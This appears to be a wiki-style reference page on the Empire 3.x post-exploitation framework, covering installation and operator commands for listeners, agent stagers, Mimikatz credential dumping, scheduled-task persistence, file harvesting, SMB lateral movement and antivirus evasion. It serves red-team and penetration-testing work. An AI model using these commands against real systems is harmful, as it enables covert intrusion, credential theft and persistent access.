## Overview
Empire 3.x is a post-exploitation framework that provides a pure PowerShell and Python agent for Windows, Linux, and macOS environments. It is used by penetration testers, red teamers, and security researchers to execute various post-exploitation tasks, including credential dumping, privilege escalation, lateral movement, and data exfiltration. Empire 3.x is the updated version of the original Empire framework and continues to be actively developed and maintained by the BC Security team.

Empire 3.x is notable for its flexible, modular design and its ability to operate stealthily using obfuscated scripts and payloads that bypass many traditional security defenses.

## Features
- **Multi-Platform Support:** Provides agents for Windows, Linux, and macOS environments.
- **PowerShell and Python Agents:** Uses PowerShell agents for Windows and Python agents for cross-platform support.
- **Modular Design:** Offers a wide range of modules for various post-exploitation activities, including credential dumping, privilege escalation, and lateral movement.
- **Obfuscation and Evasion:** Incorporates techniques to bypass antivirus and endpoint detection and response (EDR) systems using script obfuscation and in-memory execution.
- **Encrypted Communications:** Uses encrypted communication channels (HTTP, HTTPS, and SMB) for secure command and control (C2) operations.
- **Staging and Fileless Operation:** Supports staging and fileless execution to minimize the footprint on compromised systems.
- **Cross-Platform C2 Server:** The C2 server is written in Python and can run on any platform that supports Python 3.x.

## Website
- [Empire GitHub Repository](https://github.com/BC-SECURITY/Empire)

## Installation

### On Unix-based systems (Linux/macOS):

1. **Install Empire 3.x via GitHub:**

   - Clone the Empire repository from GitHub:

```sh
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire
```

2. **Install Dependencies:**

   - Install the required dependencies using the provided script:

```sh
./setup/install.sh
```

   - If you encounter issues, manually install Python 3.x and pip, then run:

```sh
pip install -r requirements.txt
```

3. **Start the Empire Server:**

   - Run the server using the `empire` command:

```sh
sudo ./empire
```

### On Windows:

1. **Install Empire 3.x via GitHub:**

   - Clone the Empire repository from GitHub:

```sh
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire
```

2. **Install Dependencies:**

   - Install Python 3.x from the [official Python website](https://www.python.org/).

   - Install the required dependencies using pip:

```powershell
pip install -r requirements.txt
```

3. **Start the Empire Server:**

   - Run the server using the `empire` command in PowerShell:

```powershell
.\empire
```

## Basic Usage
Empire 3.x is a comprehensive framework with many modules and capabilities. Here are some basic commands and usage examples:

### Starting the Empire Server
To start the Empire server:

```sh
sudo ./empire
```

- The server will start, and you will be presented with the Empire console.

### Creating and Managing Agents
To create a new listener and generate an agent:

1. **Create a Listener:**

   - Use the `listeners` command to create a new listener:

```shell
listeners
uselistener http
set Name my_listener
execute
```

2. **Generate an Agent:**

   - Use the `uselistener` command to select your listener and then generate a payload:

```shell
usestager windows/launcher_bat
set Listener my_listener
generate
```

3. **Deploy the Agent:**

   - Run the generated payload on the target machine to establish an agent connection.

### Running Modules on Agents
To run modules on compromised agents:

1. **Interact with an Agent:**

   - Use the `agents` command to list all active agents and interact with a specific agent:

```shell
agents
interact AGENT_NAME
```

2. **Run a Module:**

   - Use the `usemodule` command to run a specific module on the agent:

```shell
usemodule credentials/mimikatz/logonpasswords
execute
```

- **`usemodule credentials/mimikatz/logonpasswords`**: Executes Mimikatz to dump credentials from memory.

### Maintaining Persistence
To establish persistence on a compromised system:

1. **Select a Persistence Module:**

   - Choose a persistence module, such as a scheduled task:

```shell
usemodule persistence/schtasks
set Listener my_listener
set TaskName UpdateCheck
set TaskTrigger daily
execute
```

- **`usemodule persistence/schtasks`**: Creates a scheduled task for persistence.

### Data Exfiltration
To exfiltrate data from a compromised system:

1. **Choose an Exfiltration Module:**

   - Use a module to search for and exfiltrate files:

```shell
usemodule collection/file_finder
set Agent AGENT_NAME
set Path C:\Users\*
set Pattern *.docx
execute
```

- **`usemodule collection/file_finder`**: Searches for files matching the specified pattern.

## Key Features and Modules

### Multi-Platform Agents
- **Description:** Provides agents for Windows, Linux, and macOS environments, allowing for cross-platform post-exploitation.
- **Usage:**
```shell
usestager windows/launcher_bat
generate
```

### Obfuscation and Evasion
- **Description:** Utilizes script obfuscation and in-memory execution to evade antivirus and endpoint detection.
- **Usage:**
```shell
usemodule obfuscation/Invoke-Obfuscation
execute
```

### Credential Dumping
- **Description:** Offers modules to extract credentials from memory, registry, and file systems, including Mimikatz integration.
- **Usage:**
```shell
usemodule credentials/mimikatz/logonpasswords
execute
```

### Lateral Movement
- **Description:** Includes modules for moving laterally within a network, such as exploiting SMB shares and remote code execution.
- **Usage:**
```shell
usemodule lateral_movement/invoke_smbexec
set Listener my_listener
execute
```

### Persistence Mechanisms
- **Description:** Provides various techniques for maintaining persistence on compromised systems, such as scheduled tasks and registry modifications.
- **Usage:**
```shell
usemodule persistence/schtasks
set Listener my_listener
set TaskName UpdateCheck
set TaskTrigger daily
execute
```

### Encrypted C2 Communication
- **Description:** Uses encrypted communication channels (HTTP, HTTPS, SMB) to ensure secure and stealthy command and control.
- **Usage:**
```shell
listeners
uselistener http
set Name secure_listener
set CertPath /path/to/cert.pem
execute
```

## Tools for Post-Exploitation and Offensive Security Using Empire 3.x

- **Command and Control (C2):** Use Empire 3.x to establish encrypted communication channels with compromised systems for remote command execution and management.
- **Privilege Escalation:** Identify and exploit opportunities to escalate privileges on compromised systems to gain deeper access.
- **Credential Harvesting:** Extract credentials from memory, files, and registries using built-in modules to access additional resources and systems.
- **Lateral Movement:** Move laterally within a network to compromise additional systems and expand access to critical assets.
- **Persistence:** Establish persistence on compromised systems to maintain long-term access and continue operations.
- **Data Exfiltration:** Extract sensitive data from compromised systems to gather valuable information and achieve objectives.

## Best Practices
- **Use Empire 3.x Responsibly:** Always ensure that you have proper authorization before using Empire 3.x for offensive security tasks and post-exploitation activities.
- **Regularly Update Modules:** Keep Empire 3.x and its modules up-to-date to benefit from the latest features, security enhancements, and bug fixes.
- **Combine with Other Tools:** Use Empire 3.x alongside other post-exploitation tools like [[PowerSploit]], [[Cobalt Strike]], and [[Metasploit]] for comprehensive assessments.
- **Practice Operational Security:** Use encrypted communication and obfuscation techniques to avoid detection and maintain stealth during operations.
- **Analyze Results Carefully:** Review the output of Empire 3.x modules carefully to identify potential vulnerabilities, misconfigurations, and opportunities for further exploitation.

## References
- [Empire GitHub Repository](https://github.com/BC-SECURITY/Empire)
- [Empire Documentation](https://bc-security.gitbook.io/empire-wiki/)
- [Empire 3.x Tutorial for Red Teaming](https://www.hackingarticles.in/comprehensive-guide-on-empire-3-x-for-red-team-operations/)
- [Empire Cheat Sheet](https://highon.coffee/blog/empire-cheat-sheet/)
- [Empire: A Framework for Post-Exploitation](https://null-byte.wonderhowto.com/how-to/use-empire-framework-for-post-exploitation-0196874/)

